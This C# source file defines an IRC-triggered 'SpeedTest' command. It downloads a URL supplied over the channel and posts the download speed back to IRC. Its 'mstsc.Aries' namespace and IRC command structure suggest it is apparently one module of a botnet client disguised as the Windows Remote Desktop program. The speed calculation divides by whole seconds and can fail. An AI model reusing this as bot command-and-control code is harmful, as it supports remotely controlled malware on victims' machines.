using System;
using System.Net;
using System.Diagnostics;

namespace mstsc.Aries.Commands
{
sealed class SpeedTest
    {
        public SpeedTest(string[] Parameters)
        {
            try
            {
                Main.Instance.IRCClient.MessageCurrentChannel("{SpeedTest} Downloading...");
                
                using (WebClient webClient = new WebClient())
                {
                    /*DateTime dt1 = DateTime.Now;
                    byte[] data = webClient.DownloadData(Parameters[2]);
                    DateTime dt2 = DateTime.Now;
                    double Speed = (data.Length * 8) / (dt2 - dt1).TotalSeconds;
                    Main.Instance.IRCClient.MessageCurrentChannel("{SpeedTest} Speed: " + Speed.ToString("N0") + "KB/s");*/
                    Stopwatch sw = Stopwatch.StartNew();
                    long ohi = webClient.DownloadData(Parameters[2]).Length;
                    sw.Stop();
                    long speed = (ohi / sw.Elapsed.Seconds) / 1024;
                    Main.Instance.IRCClient.MessageCurrentChannel("{SpeedTest} Speed: " + speed.ToString("N0") + "KB/s");
                                    
                }

                GC.Collect();
                GC.WaitForPendingFinalizers();
                GC.Collect();
            }
            catch (Exception Exception)
            {
                Main.Instance.IRCClient.MessageCurrentChannel("{SpeedTest} An error has occurred - " + Exception.Message);
            }

        }
    }
}
